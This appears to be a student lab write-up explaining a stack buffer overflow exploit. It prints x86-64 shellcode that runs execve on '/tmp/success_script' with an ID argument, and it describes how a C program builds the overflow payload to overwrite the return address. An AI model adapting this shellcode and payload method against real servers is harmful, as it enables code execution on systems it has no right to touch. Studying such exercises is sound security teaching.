Explanation of the Attack Attempt:

The attack uses a buffer overflow vulnerability to execute custom shellcode on the target server. The payload is crafted to overwrite the return address on the stack with the address of the shellcode, causing the program to jump to and execute the injected shellcode.


Assembly Commands, Order, and Purpose:
1. Clear Registers: xor %rax, %rax
*Clears the RAX register to initialize it to zero, used for constructing values or preparing for syscalls.

2. Push Strings (Reverse Order):
movq $0x0000000000747069, %rax  # "ipt\0" padded (little-endian)
pushq %rax                      # Push "ipt\0"
movq $0x7263735f73736563, %rax  # "cess_scr" (little-endian)
pushq %rax                      # Push "cess_scr"
movq $0x6375732f706d742f, %rax  # "/tmp/suc" (little-endian)
pushq %rax                      # Push "/tmp/suc"

*Pushes the null-terminated string "/tmp/success_script" onto the stack in reverse order:
"ipt\0" (0x0000000000747069)
"cess_scr" (0x7263735f73736563)
"/tmp/suc" (0x6375732f706d742f)
*Ensures the stack layout is correct for execve to find "/tmp/success_script" as argv[0].

3. Save String Address: movq %rsp, %rdi
*Saves the pointer to the constructed string /tmp/success_script (currently at the top of the stack) in %rdi.
*This becomes the first argument (argv[0]) for the execve syscall.

4. Push and Save Arguments:
movq $0x0000000000000035, %rax
pushq %rax
movq $0x3832323439373032, %rax
pushq %rax
*Pushes the argument "207942285" onto the stack.

movq %rsp, %rdx
*Saves the pointer to the argument in RDX (used for argv[1]).

5. Construct argv Array:
xor %rax, %rax
pushq %rax
pushq %rdx
pushq %rdi
*Constructs the argv array with argv[2] = NULL, argv[1] = ID, and argv[0] = script.

movq %rsp, %rsi
*Saves the pointer to the argv array in RSI.

6. Set Environment Pointer:
xor %rdx, %rdx
*Clears RDX to set envp = NULL.

7. Perform execve:
movq $59, %rax
*Sets RAX to 59 (syscall number for execve).

syscall
*Invokes the execve system call to execute the script.


Order of Commands:
* Strings are pushed first because the stack grows downward, ensuring proper memory alignment.
* Pointers are saved after pushing the corresponding values.
* Registers are cleared before use to avoid unintended values.
* Syscall arguments (RDI, RSI, RDX) are prepared according to the calling convention.

Purpose:
* These commands construct the arguments and environment for the execve system call in memory and execute it to run the desired script.

ex1.c explanation:
The C code exploits a buffer overflow vulnerability to execute arbitrary shellcode on a target server by taking the server IP, a memory address, and an offset as inputs. It constructs a payload by filling the buffer with padding (A characters) to align the data and reach the return address on the stack. The return address is overwritten with the calculated shellcode address (address_of_x + offset_to_return + 8, where 8 accounts for the size of the overwritten return address), ensuring the program jumps to the shellcode upon return. The shellcode is appended immediately after the return address, maintaining proper alignment and execution flow.
